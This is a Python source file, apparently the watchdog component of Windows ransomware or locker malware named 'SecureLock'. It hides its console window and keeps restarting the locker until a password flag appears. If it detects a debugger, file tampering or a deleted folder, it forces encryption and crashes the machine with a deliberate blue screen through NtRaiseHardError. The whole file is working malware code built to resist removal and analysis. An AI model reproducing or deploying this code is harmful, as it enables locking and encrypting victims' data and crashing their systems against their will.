# watchdog_service.py - Clean & Lethal Edition
import os, time, hashlib, subprocess, logging, psutil, ctypes
import win32file, win32con, win32process, pythoncom
from threading import Thread

APP_NAME = "SecureLock"
EXE = "securelock.exe"
APPDATA = os.path.join(os.environ["APPDATA"], APP_NAME)
FLAG = os.path.join(APPDATA, "UNLOCKED.flag")
WATCHED = [
    os.path.join(os.getcwd(), EXE),
    os.path.abspath(__file__),
    os.path.join(APPDATA, "config.ini"),
    os.path.join(APPDATA, "secure.dat")
]

logging.basicConfig(
    filename=os.path.join(APPDATA, "watchdog.log"),
    level=logging.INFO,
    format="%(asctime)s | %(message)s"
)
log = logging.getLogger()

def running():
    return any(EXE in p.name() or "python" in p.name().lower() for p in psutil.process_iter(['name']) if p.info['name'])

def start(force_encryption=False):
    path = os.path.join(os.getcwd(), EXE)
    if os.path.isfile(path):
        args = [path]
        if force_encryption:
            args.append("--force-encrypt")
        subprocess.Popen(args, creationflags=0x00000200)
        log.info("SecureLock restarted")

def unlocked():
    return os.path.exists(FLAG)

def trigger_bsod_reboot():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_byte()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
    except:
        os.system("shutdown /f /r /t 0")

class AntiTamper(Thread):
    def __init__(self):
        super().__init__(daemon=False)
        self.hashes = {}

    def hash(self, p):
        if not os.path.isfile(p): return None
        h = hashlib.sha256()
        with open(p, "rb") as f:
            for b in iter(lambda: f.read(8192), b""): h.update(b)
        return h.hexdigest()

    def run(self):
        time.sleep(3)
        self.hashes = {p: self.hash(p) for p in WATCHED}

        dir_handle = win32file.CreateFile(
            os.getcwd(), 0x0001,
            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
            None, win32con.OPEN_EXISTING,
            win32con.FILE_FLAG_BACKUP_SEMANTICS, None
        )

        while True:
            if win32process.IsDebuggerPresent():
                log.critical("Debugger detected")
                trigger_bsod_reboot()

            tampered = False
            for p, old in self.hashes.items():
                if not os.path.exists(p):
                    tampered = True; break
                if os.path.isfile(p) and self.hash(p) != old:
                    tampered = True; break
            if not os.path.exists(APPDATA):
                tampered = True

            if tampered:
                log.critical("TAMPERING DETECTED - LOCKDOWN")
                start(force_encryption=True)
                time.sleep(2)
                trigger_bsod_reboot()

            try:
                pythoncom.PumpWaitingMessages()
                win32file.ReadDirectoryChangesW(dir_handle, 1024, False,
                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                    win32con.FILE_NOTIFY_CHANGE_SIZE, None, None)
            except: time.sleep(0.5)

if __name__ == "__main__":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    AntiTamper().start()

    log.info("Watchdog active")
    while True:
        if unlocked():
            log.info("Correct password entered - Watchdog stopped")
            with open(FLAG, "r") as f:
                if f.read() != "UNLOCKED":
                    os.remove(FLAG)
                    continue
            os.remove(FLAG)
            break
        if not running():
            log.warning("SecureLock down - restarting")
            start()
        time.sleep(5)